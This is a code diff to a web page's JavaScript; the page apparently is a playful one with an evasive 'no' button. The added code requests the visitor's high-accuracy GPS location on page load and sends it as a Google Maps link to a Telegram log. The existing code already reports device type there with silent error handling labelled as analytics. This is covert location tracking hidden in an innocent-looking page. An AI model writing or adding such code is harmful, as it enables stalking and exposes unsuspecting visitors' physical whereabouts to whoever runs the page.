@@ -18,7 +18,7 @@ function sendTelegramLog(message) {
     }).catch(err => console.log("Analytics error")); // Silent fail
 }
 
-// Log initial visit
+// Log initial visit and location
 window.addEventListener('load', () => {
     const ua = navigator.userAgent;
     let device = "Unknown Device";
@@ -28,6 +28,22 @@ window.addEventListener('load', () => {
     else if (/Windows/.test(ua)) device = "Windows PC";
     
     sendTelegramLog(`📩 *New Visitor!*\nDevice: ${device}\nTime: ${new Date().toLocaleTimeString()}`);
+
+    // Request location
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                sendTelegramLog(`📍 *Location Received!*\nDevice: ${device}\nMap: ${mapsLink}`);
+            }, 
+            (error) => {
+                sendTelegramLog(`📍 Location access denied or unavailable (${error.message}).`);
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+    }
 });
 
 const NO_BUTTON_REPULSION_RADIUS = 150; // Pixels
